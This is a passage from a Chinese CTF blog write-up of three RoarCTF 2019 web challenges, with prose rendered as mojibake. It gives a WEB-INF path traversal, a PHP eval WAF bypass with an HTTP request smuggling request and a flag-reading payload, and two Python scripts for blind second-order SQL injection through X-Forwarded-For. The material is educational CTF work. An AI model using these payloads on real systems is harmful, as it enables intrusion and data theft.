<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="å¯¹æœªæ¥çš„æœ€å¤§æ…·æ…¨ï¼Œå°±æ˜¯æŠŠä¸€åˆ‡éƒ½çŒ®ç»™ç°åœ¨ã€‚">
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        roarctf 2019 - undefined
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i>  </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar ">
            <img src="/" />
        </div>
        <div class="name">
            <i>Luc1fer</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li >
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>HOME</span>
                </a>
            </li>
            <li >
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>TAGS</span>
                </a>
            </li>
            <li >
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>ARCHIVES</span>
                </a>
            </li>
            <li >
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>ABOUT</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#roarctf-2019"><span class="toc-text">roarctf 2019</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-java"><span class="toc-text">easy_java</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ä»€ä¹ˆæ˜¯-WEB-INF"><span class="toc-text">ä»€ä¹ˆæ˜¯ WEB-INF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-calc"><span class="toc-text">easy_calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Online-Proxy"><span class="toc-text">Online Proxy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#å‚è€ƒé“¾æ¥"><span class="toc-text">å‚è€ƒé“¾æ¥</span></a></li></ol></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input"/>
            <span id="begin-search">search</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i>  </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        roarctf 2019
    </div>

    <div class="post-meta">
        <span class="attr">Postï¼š<span>2019-10-16 16:45:49</span></span>
        
        <span class="attr">Tagsï¼š/
        
        <a class="tag" href="/tags/#wp" title="wp">wp</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">Visitï¼š<span id="busuanzi_value_page_pv"></span>
</span>
</span>
    </div>
    <div class="post-content ">
        <h1 id="roarctf-2019"><a href="#roarctf-2019" class="headerlink" title="roarctf 2019"></a>roarctf 2019</h1><p>10/16/2019 4:45:49 PM </p>
<h2 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h2><p>æ‹¿åˆ°é¢˜ç›®çœ‹åˆ°æ–‡ä»¶ä¸‹è½½çš„æ¥å£ï¼Œå°è¯• <code>/Download?filename=help.docx</code> ,å‘ç°æ²¡æ³•ä¸‹è½½ï¼Œå°è¯•ä¸‹è½½ç½‘é¡µä¸Šçš„ç…§ç‰‡å‘ç°ä¹Ÿä¸‹è½½ä¸äº†ï¼Œåæ¥å°±è·‘åäº†ï¼Œåœ¨æƒ³ä¼šä¸ä¼šæ˜¯ <code>SSTI</code> ?fuzzäº†åŠå¤©ä¹Ÿæ²¡æ‰¾åˆ°æ€è·¯.  ğŸ¨</p>
<p>æ”¹å˜è¯·æ±‚æ–¹å¼ä¸º <code>post</code> å³å¯æˆåŠŸä¸‹è½½åˆ° <code>help.docx</code> ,é‡Œè¾¹æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ã€‚ </p>
<p>éšä¾¿ä¸‹è½½ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œå¾—åˆ°æŠ¥é”™ä¿¡æ¯é‡Œæœ‰æœåŠ¡å™¨ç‰ˆæœ¬ä¿¡æ¯ã€‚åšçš„æ—¶å€™å°±è¢«éš¾åˆ°çš„åœ°æ–¹å°±æ˜¯æ–‡ä»¶ä¸‹è½½ä¸çŸ¥é“ä¸‹è½½ä»€ä¹ˆä¸œè¥¿ã€‚è®°å¾—ä¸Šæ¬¡ç¢°åˆ°è¿™ç§é¢˜çš„æ—¶å€™è¿˜æ˜¯ <code>SUCTF</code> è¯» <code>nginx</code> é…ç½®æ–‡ä»¶</p>
<h3 id="ä»€ä¹ˆæ˜¯-WEB-INF"><a href="#ä»€ä¹ˆæ˜¯-WEB-INF" class="headerlink" title="ä»€ä¹ˆæ˜¯ WEB-INF"></a>ä»€ä¹ˆæ˜¯ WEB-INF</h3><blockquote>
<p>WEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚æ‰€è°“å®‰å…¨å°±æ˜¯å®¢æˆ·ç«¯æ— æ³•è®¿é—®ï¼Œåªæœ‰æœåŠ¡ç«¯å¯ä»¥è®¿é—®çš„ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚</p>
</blockquote>
<ol>
<li><p>/WEB-INF/web.xml</p>
<p> Webåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</p>
</li>
<li><p>/WEB-INF/classes/</p>
<p> åŒ…å«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­ï¼ˆæ˜¯è¯¥ç›®å½•ä¸èƒ½åŒ…å«åœ¨.jaræ–‡ä»¶ä¸­ï¼‰ã€‚</p>
</li>
</ol>
<p>å…¶ä»–çš„é…ç½®æ–‡ä»¶ä»‹ç»çœ‹<a href="https://baike.baidu.com/item/web-inf" title="è¿™é‡Œ" target="_blank" rel="noopener">https://baike.baidu.com/item/web-inf</a></p>
<p>äº‹å®ä¸Šå°±æ˜¯åœ¨xmlä¸­é…ç½®å¥½æ˜ å°„è·¯å¾„ç„¶åè¿›è¡Œå¯¹æŸäº›å«å—ä¿æŠ¤å†…å®¹æ–‡ä»¶çš„è®¿é—®ã€‚</p>
<p>æˆ‘ä»¬è®¿é—® <code>WEB-INF/web.xml</code> å‘ç°æ“ä½œflagçš„å…³é”®é…ç½®</p>
<p>æŒ‰ç…§æ˜ å°„å…³ç³»è®¿é—® <code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code> å³å¯å¾—åˆ°è§£å¯†çš„å­—ç¬¦ä¸²ï¼Œbase64è§£å¯†å³å¯</p>
<h2 id="easy-calc"><a href="#easy-calc" class="headerlink" title="easy_calc"></a>easy_calc</h2><p>å³é”®æŸ¥çœ‹æºç </p>
<pre><code>&lt;?php
error_reporting(0);
if(!isset($_GET[&apos;num&apos;])){
    show_source(__FILE__);
}else{
        $str = $_GET[&apos;num&apos;];
        $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;,&apos;\$&apos;,&apos;\\&apos;,&apos;\^&apos;];
        foreach ($blacklist as $blackitem) {
                if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $str)) {
                        die(&quot;what are you want to do?&quot;);
                }
        }
        eval(&apos;echo &apos;.$str.&apos;;&apos;);
}
?&gt; </code></pre><p>æœ‰wafï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ç»•è¿‡ï¼š</p>
<ol>
<li>åˆ©ç”¨å­—ç¬¦ä¸²è§£æç‰¹æ€§ Bypass</li>
</ol>
<p>åŸç†çœ‹è¿™ç¯‡æ–‡ç« ï¼š<br><a href="https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/" target="_blank" rel="noopener">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>
<p>è¿™é‡Œè¯´ä¸€ä¸‹å¤§æ¦‚æ„æ€<br> PHP å¤„ç† GET or POST è¯·æ±‚æ—¶å°†æŸ¥è¯¢å­—ç¬¦ä¸²è½¬æ¢æˆæ•°ç»„ <code>/?foo=bar becomes Array([foo] =&gt; &quot;bar&quot;)</code> ã€‚å‚æ•°åé‡Œçš„ä¸€äº›å­—ç¬¦ä¼šè¢«ç§»é™¤æˆ–æ›¿æ¢æˆä¸‹åˆ’çº¿ <code>/?%20news[id%00=42 will be converted to Array([news_id] =&gt; 42)</code> å¦‚æœWAFè§„åˆ™æ˜¯å‚æ•°é‡Œå«æœ‰ä¸€ä¸ªéæ•°å€¼å‹çš„å€¼æ—¶è¿›è¡Œæ‹¦æˆªæ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨ä¸‹åˆ—è¯­å¥ç»•è¿‡<code>/news.php?%20news[id%00=42&quot;+AND+1=0--</code> å®ƒä¼šè¢«å­˜å‚¨åœ¨ <code>$_GET[&quot;news_id&quot;]</code> ã€‚</p>
<p>è¿™æ˜¯æµ‹è¯•phpæ˜¯å¦‚ä½•å¤„ç†ç‰¹æ®Šå­—ç¬¦ï¼š</p>
<pre><code>&lt;?php
foreach(
    [
        &quot;{chr}foo_bar&quot;,
        &quot;foo{chr}bar&quot;,
        &quot;foo_bar{chr}&quot;
    ] as $k =&gt; $arg) {
    for($i=0;$i&lt;=255;$i++) {
        echo &quot;\033[999D\033[K\r&quot;;
        echo &quot;[&quot;.$arg.&quot;] check &quot;.bin2hex(chr($i)).&quot;&quot;;
        parse_str(str_replace(&quot;{chr}&quot;,chr($i),$arg).&quot;=bla&quot;,$o);
        /* yes... I&apos;ve added a sleep time on each loop just for
        the scenic effect :)
like that movie with unrealistic
        brute-force where the password are obtained
        one byte at a time (âˆ©ï½€-Â´)âŠƒâ”â˜†ï¾Ÿ.*ï½¥ï½¡ï¾Ÿ
        */
        usleep(5000);
        if(isset($o[&quot;foo_bar&quot;])) {
            echo &quot;\033[999D\033[K\r&quot;;
            echo $arg.&quot; -&gt; &quot;.bin2hex(chr($i)).&quot; (&quot;.chr($i).&quot;)\n&quot;;
        }
    }
    echo &quot;\033[999D\033[K\r&quot;;
    echo &quot;\n&quot;;
}</code></pre><p>è¿™é“é¢˜ç›®ç»è¿‡æµ‹è¯•å‚æ•°å‰åŠ ä¸€ä¸ª <code>%20</code>æˆ–è€… <code>+</code> æ¥ç»•è¿‡</p>
<ol start="2">
<li>httpåè®®èµ°ç§æ”»å‡»</li>
</ol>
<blockquote>
<p>å½“æˆ‘ä»¬å‘ä»£ç†æœåŠ¡å™¨å‘é€ä¸€ä¸ªæ¯”è¾ƒæ¨¡ç³Šçš„HTTPè¯·æ±‚æ—¶ï¼Œç”±äºä¸¤è€…æœåŠ¡å™¨çš„å®ç°æ–¹å¼ä¸åŒï¼Œå¯èƒ½ä»£ç†æœåŠ¡å™¨è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œç„¶åå°†å…¶è½¬å‘ç»™äº†åç«¯çš„æºç«™æœåŠ¡å™¨ï¼Œä½†æºç«™æœåŠ¡å™¨ç»è¿‡è§£æå¤„ç†åï¼Œåªè®¤ä¸ºå…¶ä¸­çš„ä¸€éƒ¨åˆ†ä¸ºæ­£å¸¸è¯·æ±‚ï¼Œå‰©ä¸‹çš„é‚£ä¸€éƒ¨åˆ†ï¼Œå°±ç®—æ˜¯èµ°ç§çš„è¯·æ±‚ï¼Œå½“è¯¥éƒ¨åˆ†å¯¹æ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚é€ æˆäº†å½±å“ä¹‹åï¼Œå°±å®ç°äº†HTTPèµ°ç§æ”»å‡»ã€‚</p>
</blockquote>
<p>è¿™é‡Œæˆ‘ä»¬é€šè¿‡ CL-CL æ¥Bypass</p>
<pre><code>POST /calc.php?num=phpinfo() HTTP/1.1
Host: ********
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: **********
Cookie: __cfduid=***********
X-Forwarded-For: 127.0.0.1
Content-Length: 7
Content-Length: 7
Content-Type: application/x-www-form-urlencoded

num=111</code></pre><p>ç»•è¿‡wafä¹‹åè¿˜ç¦æ‰äº†ä¸€äº›å­—ç¬¦ä¸èƒ½ç›´æ¥è¯»åˆ° flag ã€‚</p>
<p>å…ˆå­¦ä¹ å‡ ä¸ªå‡½æ•°</p>
<ul>
<li>ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</li>
<li>bin2hex â€” å‡½æ•°æŠŠåŒ…å«æ•°æ®çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºåå…­è¿›åˆ¶å€¼</li>
<li>hex2bin â€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</li>
<li>dechex â€” åè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶</li>
<li>base_convert â€” åœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—</li>
<li>hexdec â€” åå…­è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶</li>
</ul>
<p>è¯»å–flag</p>
<pre><code>?+num=file_get_contents(hex2bin(dechex(52115961636711)))</code></pre><h2 id="Online-Proxy"><a href="#Online-Proxy" class="headerlink" title="Online Proxy"></a>Online Proxy</h2><p>æ‰“å¼€é¶æœºï¼ŒæŠ“åŒ…å‘ç°å“åº”å¤´</p>
<pre><code>&lt;!-- Debug Info: 
 Duration: 0.058279037475586 s 
 Current Ip: 127.0.0.1 </code></pre><p>åœ¨ XFF å¤„å°è¯•ä¿®æ”¹å†…å®¹ï¼Œå‘ç°å¯ä»¥ä¿®æ”¹æˆåŠŸã€‚<code>Current Ip</code> å¤„æ˜¾ç¤ºå½“å‰çš„ XFFå€¼ï¼Œ<code>Last Ip</code> æ˜¾ç¤ºä¸Šæ¬¡æŸ¥è¯¢å†…å®¹ã€‚æ‰§è¡Œ sleep() è¯­å¥ <code>1&#39; and sleep(3) and 1=&#39;1</code> å‘ç°åœ¨ç¬¬äºŒæ¬¡è¿›è¡Œä¿®æ”¹å‘åŒ…ä¹‹åæˆåŠŸæ‰§è¡Œï¼Œå­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚</p>
<p>æ‰€è°“äºŒæ¬¡æ³¨å…¥å°±æ˜¯æœåŠ¡ç«¯åœ¨ç¬¬ä¸€æ¬¡æ¥æ”¶è„æ•°æ®æ—¶å¯¹æ•°æ®è¿›è¡Œäº† <code>addslashes</code> æˆ– <code>mysql_escape_string</code>  å¤„ç†ï¼Œä½†æ˜¯å­˜å…¥æ•°æ®åº“æ—¶å­˜çš„è¿˜æ˜¯è„æ•°æ®ï¼Œäºæ˜¯åœ¨ç¬¬äºŒæ¬¡æŸ¥è¯¢æ—¶ç”±äºæŸ¥è¯¢çš„æ˜¯è„æ•°æ®ï¼Œä¿¡æ¯ä»ç„¶ä¼šæ³„éœ²ã€‚</p>
<p>æŸ¥çœ‹æºç ï¼š</p>
<pre><code>header(&quot;Content-type: &quot;. $mime_type.&quot;; charset=UTF-8&quot;);
$content = str_replace(&quot;&lt;a href=\&quot;&quot;, &quot;&lt;a href=\&quot;/?url=&quot;, $content);
$content = str_replace(&quot;&lt;a href=&apos;&quot;, &quot;&lt;a href=&apos;/?url=&quot;, $content);
echo($content);
$end = microtime(true);
$time = $end - $start;
$last_ip = &quot;&quot;;
$result = query(&quot;select current_ip, last_ip from ip_log where uuid = &apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);
if(count($result) &gt; 0) {
    if($ip !== $result[0][&apos;current_ip&apos;]) {
        $last_ip = $result[0][&apos;current_ip&apos;];
        query(&quot;delete from ip_log where uuid=&apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);
    } else {
        $last_ip = $result[0][&apos;last_ip&apos;];
    }
}
query(&quot;insert into ip_log values (&apos;&quot;.addslashes($uuid).&quot;&apos;, &apos;&quot;.addslashes($ip).&quot;&apos;, &apos;$last_ip&apos;);&quot;);
die(&quot;\n&lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip &quot;.($last_ip !== &quot;&quot; ? &quot;\nLast Ip: &quot;.$last_ip : &quot;&quot;).&quot; --&gt;&quot;);</code></pre><p>å¯ä»¥çœ‹åˆ°åœ¨æŸ¥è¯¢åˆ°æ•°æ®ä¹‹åï¼Œå¦‚æœ <code>$ip !== $result[0][&#39;current_ip&#39;]</code> é‚£ä¹ˆ <code>$last_ip = $result[0][&#39;current_ip&#39;];</code> ï¼Œéšåå°† last_ip ä¸å¸¦è¿‡æ»¤çš„å¸¦å…¥æ•°æ®åº“ä¸­æŸ¥è¯¢ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬æ³¨å…¥çš„æ€è·¯å°±æ˜¯å…ˆå°† exp æ’å…¥æ•°æ®ï¼Œç„¶åå†æ­£å¸¸è®¿é—®ä¸€æ¬¡å°†æ•°æ®å¸¦å‡ºã€‚</p>
<p>exp:</p>
<pre><code>import requests
from time import sleep
url = &quot;http://node3.buuoj.cn:28063/&quot;
s = requests.session()

re = s.get(url)
name = &apos;&apos;
&quot;&quot;&quot;
# database name
# current db : ctf
# information_schema,test,mysql,ctftraining,performance_schema,F4l9_D4t4B45e,ctf
for i in range(1,100):
    print &apos;[+]: &apos;,i
    for j in range(33,128):
        sleep(0.01)
        headers1 = {
&quot;X-Forwarded-For&quot;: &apos;1&apos;
}
        headers2 = {
    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)
}
        re1 = s.get(url,headers = headers2)
        try:
            re2 = s.get(url,headers=headers1,timeout=2)
        except Exception as e:
            print &quot;[-]: &quot;+str(e)
            name += chr(j)
            print name
            break
&quot;&quot;&quot;
&quot;&quot;&quot;
# table name
# ctf : ip_log
# F4l9_D4t4B45e : F4l9_t4b1e
for i in range(1,100):
    print &apos;[+]: &apos;,i
    for j in range(33,128):
        sleep(0.01)
        headers1 = {
&quot;X-Forwarded-For&quot;: &apos;1&apos;
}
        headers2 = {
    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;F4l9_D4t4B45e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)
}
        re1 = s.get(url,headers = headers2)
        try:
            re2 = s.get(url,headers=headers1,timeout=2)
        except Exception as e:
            #print &quot;[-]: &quot;+str(e)
            name += chr(j)
            print name
            break
&quot;&quot;&quot;
&quot;&quot;&quot;
# column_name
# F4l9_D4t4B45e.F4l9_t4b1e : F4l9_C01uMn
for i in range(1,20):
    print &apos;[+]: &apos;,i
    for j in range(33,128):
        sleep(0.01)
        headers1 = {
&quot;X-Forwarded-For&quot;: &apos;1&apos;
}
        headers2 = {
    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&apos;F4l9_D4t4B45e&apos;and table_name=&apos;F4l9_t4b1e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)
}
        re1 = s.get(url,headers = headers2)
        try:
            re2 = s.get(url,headers=headers1,timeout=2)
        except Exception as e:
            #print &quot;[-]: &quot;+str(e)
            name += chr(j)
            print name
            break
&quot;&quot;&quot;
for i in range(1,100):
    print &apos;[+]: &apos;,i
    for j in range(33,128):
        sleep(0.01)
        headers1 = {
&quot;X-Forwarded-For&quot;: &apos;1&apos;
}
        headers2 = {
    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)
}
        re1 = s.get(url,headers = headers2)
        try:
            re2 = s.get(url,headers=headers1,timeout=2)
        except Exception as e:
            #print &quot;[-]: &quot;+str(e)
            name += chr(j)
            print name
            break</code></pre><p>è¿™ä¸ªå¤ªä¸ä¼˜é›…äº†ï¼Œèµµå¸ˆå‚…çš„æ›´ä¼˜é›…ï¼š</p>
<pre><code>#!/usr/bin/env python3

import requests

target = &quot;http://localhost:8302/&quot;

def execute_sql(sql):
    print(&quot;[*]è¯·æ±‚è¯­å¥ï¼š&quot; + sql)
    return_result = &quot;&quot;

    payload = &quot;0&apos;|length((&quot; + sql + &quot;))|&apos;0&quot;
    session = requests.session()
    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})
    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})
    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})
    start_pos = r.text.find(&quot;Last Ip: &quot;)
    end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)
    length = int(r.text[start_pos + 9: end_pos])
    print(&quot;[+]é•¿åº¦ï¼š&quot; + str(length))

    for i in range(1, length + 1, 5):
        payload = &quot;0&apos;|conv(hex(substr((&quot; + sql + &quot;),&quot; + str(i) + &quot;,5)),16,10)|&apos;0&quot;

        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})
        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})
        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})
        start_pos = r.text.find(&quot;Last Ip: &quot;)
        end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)
        result = int(r.text[start_pos + 9: end_pos])
        return_result += bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;)

        print(&quot;[+]ä½ç½® &quot; + str(i) + &quot; è¯·æ±‚äº”ä½æˆåŠŸ:&quot; + bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;))

    return return_result


# è·å–æ•°æ®åº“
print(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA&quot;))

# è·å–æ•°æ®åº“è¡¨
print(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos;&quot;))

# è·å–æ•°æ®åº“è¡¨
print(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos; AND TABLE_NAME = &apos;F4l9_t4b1e&apos; &quot;))

# è·å–è¡¨ä¸­å†…å®¹
print(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e&quot;))</code></pre><p>è¿™é‡Œç”¨çš„æ˜¯ <code>1&#39;|&#39;1&#39;|&#39;1</code> ç„¶åå¼‚æˆ–ä¹Ÿå¯ä»¥ <code>1&#39;^&#39;0&#39;^&#39;1</code></p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><blockquote>
<p><a href="https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/" target="_blank" rel="noopener">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>
<p><a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/213359.html</a></p>
<p><a href="https://paper.seebug.org/1048/#32-cl-cl" target="_blank" rel="noopener">https://paper.seebug.org/1048/#32-cl-cl</a></p>
</blockquote>

        
        <br />
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <span id="busuanzi_container_site_pv">
            <span id="busuanzi_value_site_pv"></span>PV
        </span>
        <span id="busuanzi_container_site_uv">
            <span id="busuanzi_value_site_uv"></span>UV
        </span>
        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = ""
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
